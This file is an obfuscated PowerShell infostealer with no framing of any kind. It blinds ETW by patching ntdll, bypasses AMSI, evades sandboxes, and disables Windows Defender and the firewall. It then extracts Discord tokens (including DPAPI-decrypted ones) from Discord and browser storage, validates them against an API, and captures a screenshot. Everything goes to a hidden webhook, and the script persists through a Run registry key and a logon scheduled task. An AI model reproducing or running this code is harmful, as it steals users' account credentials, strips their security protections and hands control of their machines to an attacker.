# ═══ In-Memory Patches (Polymorphic) ═══
# ETW blind (P/Invoke)
Start-Sleep -Milliseconds 18
$e2Gudwa = @"
[DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr h, string n);
[DllImport("kernel32.dll")] public static extern IntPtr LoadLibrary(string n);
[DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o);
"@
$X7T5qw = Add-Type -MemberDefinition $e2Gudwa -Name 'GetObject68' -Namespace 'HandleEntry76' -PassThru
Start-Sleep -Milliseconds 0
$R6OepGX = ([char]110+[char]116+[char]100+[char]108+[char]108+[char]46+[char]100+[char]108+[char]108)
$O5JqE = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXR3RXZlbnRXcml0ZQ=="))
$hulz = $X7T5qw::LoadLibrary($R6OepGX)
$AoVFM = $X7T5qw::GetProcAddress($hulz, $O5JqE)
$CI3Nc = [int](1976) % 256
$A93uyf = 0
$X7T5qw::VirtualProtect($AoVFM, [UIntPtr]::new(1), 0x40, [ref]$A93uyf) | Out-Null
$LK49 = [byte[]](0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($LK49, 0, $AoVFM, $LK49.Length)
$X7T5qw::VirtualProtect($AoVFM, [UIntPtr]::new(1), $A93uyf, [ref]$A93uyf) | Out-Null
Start-Sleep -Milliseconds 42

# Runtime memory patch
[void]([Math]::Abs(69006))
$XoWUMTS = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHM="))
$pdZW1 = [int](8557) % 256
$Gspb = (-join([byte[]](0x61,0x6d,0x73,0x69,0x49,0x6e,0x69,0x74,0x46,0x61,0x69,0x6c,0x65,0x64)|%{[char]$_}))
$afli = [Ref].Assembly.GetType($XoWUMTS)
[void]([Math]::Abs(4474))
$BDQZwOGe = $afli.GetField($Gspb, (-join([byte[]](0x4e,0x6f,0x6e,0x50,0x75,0x62,0x6c,0x69,0x63,0x2c,0x53,0x74,0x61,0x74,0x69,0x63)|%{[char]$_})))
$BDQZwOGe.SetValue($null, $true)
Start-Sleep -Milliseconds 23

# Environment validation
$V7YBI = (Get-WmiObject -Class Win32_ComputerSystem).NumberOfLogicalProcessors
if ($V7YBI -lt 2) { exit }
$LXwyHfy = (Get-WmiObject -Class Win32_ComputerSystem).TotalPhysicalMemory
if ($LXwyHfy -lt 2GB) { exit }
$nC7InfX = [System.DateTime]::Now
Start-Sleep -Milliseconds 2159
if (([System.DateTime]::Now - $nC7InfX).TotalMilliseconds -lt 1727) { exit }

function CheckState88($d,$k){$b="";for($i=0;$i-lt$d.Length;$i++){$b+=[char]($d[$i]-bxor$k[$i%$k.Length])};[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b))}
# === POLYMORPHIC PAYLOAD ===
function Get-Payload {
    $r = Get-Random -Minimum 1000 -Maximum 9999
    $s = @(
        (CheckState88 @(155,105,112,184) @(250,62,38,140)),
        (CheckState88 @(98,142,100,247,77,178,96,203,112,166,33,247,112,248,0,166) @(41,203,81,155)),
        (CheckState88 @(33,190,68,75,94,243,17,191,75,16,92,236,20,132,68,14,118,220,30,238) @(117,211,18,123,18,159)),
        (CheckState88 @(134,128,102,16,5,100,51,16,141,144,13,119,3,65,1,22,182,170,60,30) @(212,199,95,35,103,9,75,102)),
        (CheckState88 @(128,1,227,19,61,131,16,240,31,35,164,52,203,79,19,163,38,254,73,55,170,26,213,19,61,156,8,182,31,107,157,59,222,78,96,190,38,192,42,44,175,1,178,22,59,249,114,241,31,107,141,48,228,78,49,163,32,211,57,32,134,56,194,11,23,178,115,240,29,1,163,46,229,63,96,177,32,181,72,47,169,21,193,12,59,162,123,253,30,107,255,55,228,52,20,179,8,254,23,100) @(203,66,135,124,89))
    )
    return ($s -join '') + ([char]0x20+[char]0x23) + $r
}

# === AMSI BYPASS (multi-layer) ===
function Bypass-AMSI {
    try {
        $a = -join ((83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,65,109,115,105,85,116,105,108,115) | ForEach-Object { [char]$_ })
        $b = -join ((97,109,115,105,73,110,105,116,70,97,105,108,101,100) | ForEach-Object { [char]$_ })
        $type = [Ref].Assembly.GetType($a)
        if ($null -ne $type) {
            $field = $type.GetField($b, 'NonPublic,Static')
            if ($null -ne $field) { $field.SetValue($null, $true) }
        }
    } catch {}
    try {
        $c = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
        if ($null -ne $c) {
            $field = $c.GetField('amsiInitFailed', 'NonPublic,Static')
            if ($null -ne $field) { $field.SetValue($null, $true) }
        }
    } catch {}
    try {
        $ctx = [Ref].Assembly.GetType('System.Management.Automation.AmsiContext')
        if ($null -ne $ctx) {
            $field = $ctx.GetField('amsiEnabled', 'NonPublic,Static')
            if ($null -ne $field) { $field.SetValue($null, $false) }
        }
    } catch {}
}
Bypass-AMSI

# === ETW BYPASS ===
try {
    $etwType = [Ref].Assembly.GetType('System.Management.Automation.Internal.PipelineOps')
    if ($null -ne $etwType) {
        $field = $etwType.GetField('etwEnabled', 'NonPublic,Static')
        if ($null -ne $field) { $field.SetValue($null, $false) }
    }
} catch {}

# === CONFIG ===
$hook = (CheckState88 @(43,80,83,104,123,196,23,226,6,97,56,51,121,212,20,190,40,43,75,51,84,225,20,162,40,75,56,48,123,203,49,162,46,42,87,49,121,203,99,162,43,43,76,46,85,216,15,174,5,92,72,32,86,200,3,225,7,114,84,109,86,230,3,173,7,76,76,34,85,229,99,166,24,78,64,33,79,202,12,135,43,76,75,42,122,200,12,167,4,118,87,18,77,225,62,185,18,40,105,30,76,212,62,128,29,116,87,33,122,196,12,165,43,98,87,20,75,203,49,174,28,80,105,50,74,190,20,185,24,114,67,55,125,212,19,229,41,117,75,14,123,202,16,158,6,64,84,44,87,216,8,153,40,98,91,48,76,217,54,187,24,89,60,101) @(74,24,1,88,24,140,90,212))
$api = (CheckState88 @(141,210,175,229,171,164,215,203,153,177,213,241,156,141,134,134,248,206,159,163,160,247,179,163,170,191,163,149,182,143,135,236,153,191,163,154,254,165,155,164,143,244,176,163,153,171,171,145) @(236,154,253,213,200))
$rgx = '[\w-]{24,}\.[\w-]{4,}\.[\w-]{27,}'
$mfa = 'mfa\.[\w-]{84}'
$isSystem = ([Security.Principal.WindowsIdentity]::GetCurrent().Name -eq (CheckState88 @(32,129,183,57,195,122,220,33,190,163,103,193,127,220,38,183,190,24,220,118,223,69,191,160,10,195,17,183) @(116,237,230,94,146,44,138)))
$firstRun = $true

# === DISABLE DEFENDER ===
Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
netsh advfirewall set allprofiles state off > $null

# === TOKEN EXTRACTION ===
function Read-FileBytes {
    param([string]$path)
    try {
        $fs = [System.IO.File]::Open($path, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
        $ms = New-Object System.IO.MemoryStream
        $fs.CopyTo($ms)
        $fs.Close()
        $fs.Dispose()
        $result = $ms.ToArray()
        $ms.Close()
        $ms.Dispose()
        return $result
    } catch { return $null }
}

function Validate-Token {
    param([string]$token)
    if ([string]::IsNullOrEmpty($token)) { return $false }
    if ($token.Length -gt 120 -or $token.Length -lt 59) { return $false }
    if ($token -like 'mfa.*') { return $true }
    $parts = $token -split '\.'
    if ($parts.Count -ne 3) { return $false }
    try {
        $p = $parts[0]
        $pad = 4 - ($p.Length % 4)
        if ($pad -ne 4) { $p += '=' * $pad }
        $decoded = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($p))
        $val = [long]::Parse($decoded)
        return $true
    } catch { return $false }
}

$found = [System.Collections.Generic.HashSet[string]]::new([System.StringComparer]::Ordinal)

if (-not $isSystem -and $firstRun) {
    $ldbPaths = [System.Collections.Generic.List[string]]::new()

    # Discord Apps
    $discordApps = @((CheckState88 @(136,220,119,141,239,223,235,226,65,182,139,208) @(210,155,27,247,182,237)), (CheckState88 @(112,187,54,185,96,144,155,90,112,187,20,171,91,207,228,90,79,173,103,254) @(42,252,90,195,57,162,162,35)), (CheckState88 @(52,67,165,228,112,92,61,176,196,97,44,52,144,249,20,83) @(110,4,201,158,41)), (CheckState88 @(47,16,201,155,111,52,177,12,13,226,179,90,98,229,35,36,199,210,116,114,210,34,98,149) @(117,87,165,225,54,6,136)))
    foreach ($d in $discordApps) {
        $p = Join-Path $env:APPDATA ($d + (CheckState88 @(185,202,234,232,141,221,194,247,168,201,220,174,182,220,206,236,187,189,196,253,182,168,210,182,187,216,234,245,141,136,185,185) @(225,143,146,158,212,239,132,132)))
        if (Test-Path $p) { $ldbPaths.Add($p) | Out-Null }
    }

    # Browsers
    $browserBasePaths = @(
        @{ Path = ($env + (CheckState88 @(168,168,168,34,182,243,150,63,182,149,146,35,181,134,150,39,182,149,168,58,133,241,233,28,133,132,134,17,182,241,184,11,133,241,225,30,191,133,134,8,189,155,153,21,181,132,150,66,190,146,237,79) @(231,195,208,114))); Default = (CheckState88 @(220,186,161,147,4,11,47,53,234,188,202,195) @(142,253,247,254,93,83,121,70)) },
        @{ Path = ($env + (CheckState88 @(180,6,23,136,171,177,189,32,62,142,184,208,169,40,41,141,171,215,131,35,14,143,180,248,153,94,33,174,160,239,169,14,61,143,168,239,161,59,23,142,153,179,173,20,38,157,168,233,159,42,42,229) @(251,109,111,216,250,129))); Default = (CheckState88 @(84,28,7,49,100,94,13,34,56,124,59,102) @(6,91,81,92,61)) },
        @{ Path = ($env + (CheckState88 @(119,0,204,154,149,8,45,249,155,146,122,58,230,143,130,109,58,226,178,135,91,6,242,248,158,110,37,194,144,170,106,88,237,146,142,84,51,241,128,189,97,51,238,166,136,109,33,205,168,247,92,17,238,146,142,91,61,236,132,168,91,2,246,143,157,96,57,220) @(56,107,180,202,196))); Default = (CheckState88 @(42,235,133,187,206,137,120,91,28,237,238,235) @(120,172,211,214,151,209,46,40)) },
        @{ Path = ($env + (CheckState88 @(200,150,64,149,139,202,151,202,172,110,135,139,168,148,193,168,105,147,162,173,176,223,167,80,167,157,168,161,223,187,110,191,128,162,152,224,175,127,131,234,163,128,186,192) @(135,253,56,197,218,250,209))); Default = (CheckState88 @(102,118,144,176,109,105,144,174,80,112,251,224) @(52,49,198,221)) }
    )
    foreach ($bp in $browserBasePaths) {
        if (Test-Path $bp.Path) {
            $profiles = Get-ChildItem $bp.Path -Directory -ErrorAction SilentlyContinue | Where-Object {
                $_.Name -eq (CheckState88 @(128,210,225,67,18,140,132,230,211,111,118,233) @(210,149,183,46,75,212)) -or $_.Name -like (CheckState88 @(2,85,83,63,204,58,113,106,19,197,22,108) @(87,29,25,73,150))
            }
            foreach ($prof in $profiles) {
                $ldbDir = Join-Path $prof.FullName (CheckState88 @(42,237,40,39,39,253,102,42,43,153,67,59,29,199,87,35,36,252,105,62,36,242,75,33,28,237,67,36) @(126,170,17,77))
                if ((Test-Path $ldbDir) -and (-not $ldbPaths.Contains($ldbDir))) {
                    $ldbPaths.Add($ldbDir) | Out-Null
                }
            }
        }
    }

    $iso = [System.Text.Encoding]::GetEncoding((CheckState88 @(76,5,88,199,83,7,113,163,81,7,125,227,82,2,43,170) @(31,83,22,151)))
    $dpapiMagic = (CheckState88 @(150,10,33,46,6,119,234,118) @(215,75,96,111,71,54))
    $regexObj = [System.Text.RegularExpressions.Regex]::new($rgx, [System.Text.RegularExpressions.RegexOptions]::Compiled)
    $mfaObj = [System.Text.RegularExpressions.Regex]::new($mfa, [System.Text.RegularExpressions.RegexOptions]::Compiled)

    foreach ($p in $ldbPaths) {
        if (-not (Test-Path $p)) { continue }
        $files = Get-ChildItem $p -File -ErrorAction SilentlyContinue | Where-Object { $_.Extension -in '.ldb', '.log' }
        foreach ($fl in $files) {
            $b = Read-FileBytes -path $fl.FullName
            if ($null -eq $b -or $b.Length -lt 8) { continue }
            $str = $iso.GetString($b)

            foreach ($m in $regexObj.Matches($str)) { $null = $found.Add($m.Value) }
            foreach ($m in $mfaObj.Matches($str)) { $null = $found.Add($m.Value) }

            $searchStart = 4
            $blobCount = 0
            while ($searchStart -lt ($b.Length - 8) -and $blobCount -lt 30) {
                $idx = $str.IndexOf($dpapiMagic, $searchStart, [System.StringComparison]::Ordinal)
                if ($idx -lt 0) { break }
                $start = $idx - 4
                if ($start -ge 0 -and $b[$start] -le 3 -and $b[$start + 1] -eq 0 -and $b[$start + 2] -eq 0 -and $b[$start + 3] -eq 0) {
                    $blobCount++
                    if (($start + 8) -le $b.Length) {
                        $len = [BitConverter]::ToUInt32($b, $start + 4)
                        if ($len -gt 0 -and $len -lt 100000 -and ($start + $len) -le $b.Length) {
                            try {
                                $blob = [byte[]]::new($len)
                                [Array]::Copy($b, $start, $blob, 0, $len)
                                $dec = [Security.Cryptography.ProtectedData]::Unprotect($blob, $null, [Security.Cryptography.DataProtectionScope]::CurrentUser)
                                $tok = [System.Text.Encoding]::UTF8.GetString($dec).Trim([char]0)
                                if ($tok -match $rgx -or $tok -match $mfa) { $null = $found.Add($tok) }
                            } catch {}
                        }
                    }
                }
                $searchStart = $idx + 4
            }
        }
    }
}

# === TOKEN VALIDATION ===
$validTokens = [System.Collections.Generic.List[object]]::new()

if (-not $isSystem -and $firstRun -and $found.Count -gt 0) {
    $validated = [System.Collections.Generic.List[string]]::new()
    foreach ($token in $found) {
        if (Validate-Token -token $token) { $validated.Add($token) }
    }

    foreach ($token in $validated) {
        try {
            $headers = @{
                Authorization = $token
                (CheckState88 @(189,148,83,223,245,130,253,95,233,164,189,185,121,242,171,214) @(235,204,29,179,150))  = (CheckState88 @(36,156,142,143,17,156,207,202,41,152,143,136,60,161,246,222,59,141,211,201,18,166,229,207,20,248,250,222,36,167,230,222,61,159,246,204,61,143,196,222,38,249,219,204,62,161,230,142,57,131,208,139,62,136,220,132) @(112,203,183,185))
            }
            $r = Invoke-RestMethod -Uri $api -Headers $headers -TimeoutSec 3 -ErrorAction Stop
            if ($r.id) {
                $validTokens.Add([PSCustomObject]@{
                    u    = ($($r.username) + "#" + $($r.discriminator))
                    id   = $r.id
                    em   = if ($r.email) { $r.email } else { (CheckState88 @(222,118,190,178) @(138,31,135,240,117)) }
                    ph   = if ($r.phone) { $r.phone } else { (CheckState88 @(88,182,15,2) @(12,223,54,64,201)) }
                    ni   = switch ($r.premium_type) { 1 { (CheckState88 @(169,129,43,145,242,203,253,35,160,230,197,142) @(248,179,83,249,145)) } 2 { (CheckState88 @(100,206,145,35,134,93,155,192) @(48,163,253,19,229)) } default { (CheckState88 @(75,103,47,2,48,22,126,34) @(31,10,22,119,106,71,67)) } }
                    mf   = if ($r.mfa_enabled) { (CheckState88 @(59,85,94,142) @(108,2,8,244,190,34,75)) } else { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Tm8="))) }
                    token = $token
                })
            }
        } catch {}
    }
}

# === SCREENSHOT ===
Add-Type -AssemblyName System.Windows.Forms
$bmp = New-Object Drawing.Bitmap([Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)
[Drawing.Graphics]::FromImage($bmp).CopyFromScreen(0,0,0,0,$bmp.Size)
$ms = New-Object IO.MemoryStream
$bmp.Save($ms, [Drawing.Imaging.ImageFormat]::Png)
$bytes = $ms.ToArray()
$ms.Close()

# === SEND TO WEBHOOK ===
if ($firstRun) {
    $report = ((CheckState88 @(14,233,158,250,142,107,135,61,19,198,184,203,138,84,147,56,16,235,168,219,137,108,135,35,29,211,129,233,155,107,147,52,10,233,175,165) @(69,128,238,152,216,7,209,112)) + $env + (CheckState88 @(136,158,159,170,155,145,183,135,172,138,145,166,133,145,137,137,167,128,138,153,164,199,135,131,128,174,180,236) @(199,245,209,250,207)) + $env + (CheckState88 @(14,99,62,206,143,23,69,39,203,136,112,73,43,246,135,41,109,47,246,182,8,73,58,236,188,115,89,29,249,167,46,104) @(65,15,104,154,221)) + $($validTokens.Count) + (CheckState88 @(233,138,230,33) @(170,237,137,28,186,140,220,90)))
    
    # Build token list
    foreach ($ti in $validTokens) {
        $report += (([char]0x2a+[char]0x2a) + $($ti.u) + (CheckState88 @(86,116,121,249,186,243,81,111,71,65,134,218,253,47,92,32) @(29,29,22,178,236,180,104)) + $($ti.token) + (CheckState88 @(100,25,78,3,111,28,81,46) @(61,88,62,73)) + $($ti.id) + (CheckState88 @(21,68,219,91,15,120,225,92,25,70,204,18) @(86,47,141,47)) + $($ti.em) + (CheckState88 @(27,134,47,115,42,106,223,1,83,33,25,215) @(88,234,109,28,72)) + $($ti.ph) + (CheckState88 @(30,195,104,41,241,74,23,222,17,105,164,69,12,252,50,62) @(93,168,93,89,149,2)) + $($ti.ni) + "/" + $($ti.mf) + (CheckState88 @(66,41,230,245) @(1,78,137,200,196,25,170)))
    }

    # Send main message
    try {
        Invoke-RestMethod -Uri $hook -Method Post -Body @{content=$report} -ErrorAction SilentlyContinue
    } catch {}

    # Send screenshot if exists
    if ($bytes) {
        try {
            $boundary = (CheckState88 @(198,201,211,84,195,187,208,171,129,104,221,220,233,247,181,99,237,222,220,239,185,103,201,148,239,203,222,29) @(138,154,227,32,143,237)) + (Get-Random).ToString()
            $LF = (CheckState88 @(133,163,49,252) @(193,242,94,193))
            $body = (
                (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LS0="))) + $boundary + $LF) +
                ((CheckState88 @(102,26,79,93,193,240,227,66,76,53,25,224,214,237,121,95,20,27,235,199,209,112,68,0,74,207,216,210,109,69,79,81,199,228,132,92,113,46,122,205,248,204,117,93,47,127,148,219,229,96,105,31,114,200,219,198,109,127,55,31,236,240,239,71,74,49,126,208,238,226,6,68,38,127,228,222,214,5,102,15,114,242,225,192,84,26,30,94,193,244,128,64,74,27,76,194,254,210,10,21) @(55,40,118,40,165,183,181)) + $LF) +
                ((CheckState88 @(130,157,87,170,36,56,54,78,183,236,95,138,37,39,34,87,156,198,44,175,34,40,38,85,137,252,87,168,34,18,3,6) @(211,175,110,223,64,127,96,59)) + $LF + $LF)
            )
            $footer = ($LF + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LS0="))) + $boundary + ([char]0x2d+[char]0x2d) + $LF)
            
            $headerBytes = [Text.Encoding]::ASCII.GetBytes($body)
            $footerBytes = [Text.Encoding]::ASCII.GetBytes($footer)
            $totalLength = $headerBytes.Length + $bytes.Length + $footerBytes.Length
            
            $webRequest = [Net.WebRequest]::Create($hook)
            $webRequest.Method = (CheckState88 @(36,141,205,68,144,127,248,76) @(113,200,244,16,198,62,197))
            $webRequest.ContentType = ((CheckState88 @(142,224,138,7,136,255,176,3,181,224,150,68,160,138,134,2,143,213,236,0,182,255,154,68,181,236,175,19,181,213,229,69,142,213,142,28,143,214,183,77) @(236,184,220,116)) + $boundary)
            $webRequest.ContentLength = $totalLength
            
            $reqStream = $webRequest.GetRequestStream()
            $reqStream.Write($headerBytes, 0, $headerBytes.Length)
            $reqStream.Write($bytes, 0, $bytes.Length)
            $reqStream.Write($footerBytes, 0, $footerBytes.Length)
            $reqStream.Close()
            $webRequest.GetResponse()
        } catch {}
    }
}

# === PERSISTENCE ===
$cmd = (CheckState88 @(245,190,153,166,224,206,179,218,244,253,192,138,194,214,143,250,156,231,192,221,218,174,149,227,216,209,192,206,247,195,215,141,250,205,251,241,160,206,249,205,207,161,238,239,243,213,200,147,220,253,254,137,250,210,232,250,155,201,212,206,207,128,226,242,243,251,149,204,240,249,254,137,195,248,138,241,179,146,253,138,242,177,226,239,245,255,193,214,246,215,208,202,236,248,222,230,157,231,253,139,207,151,246,239,224,206,179,202,247,136,163,201,250,194,143,166,181,205,219,204,244,170,153,239,227,193,141,218,244,253,208,141,237,193,243,236,180,244,212,137,218,161,226,229,223,209,175,211,217,137,216,143,194,252,131,226,160,247,249,207,218,202,238,227,216,255,204,215,246,192,211,151,235,194,251,255) @(150,249,160,149,186))
Set-ItemProperty -Path (CheckState88 @(136,224,5,211,140,10,99,184,240,67,174,183,58,91,191,205,18,250,140,61,71,140,201,27,244,183,103,105,185,151,43,167,130,24,119,171,199,28,197,172,58,32,149,198,32,164,140,39,112,182,243,4,243,156,4,127,184,203,63,231,184,108,38,184,240,31,193,175) @(219,165,113,151,218,94,19)) -Name (CheckState88 @(73,48,152,81,176,88,59,199,71,219,81,110,173,23,188,102,99,172,118,223,76,69,162,76,136,87,80,155) @(31,2,244,36,234)) -Value $cmd -ErrorAction SilentlyContinue
schtasks /create /tn (CheckState88 @(233,51,101,61,136,248,56,58,43,227,241,109,80,123,132,198,96,81,26,231,236,70,95,32,176,247,83,102) @(191,1,9,72,210)) /tr ($cmd) /sc onlogon /f /rl highest /it > $null 2>&1

# === INSTANT EXIT ===
exit
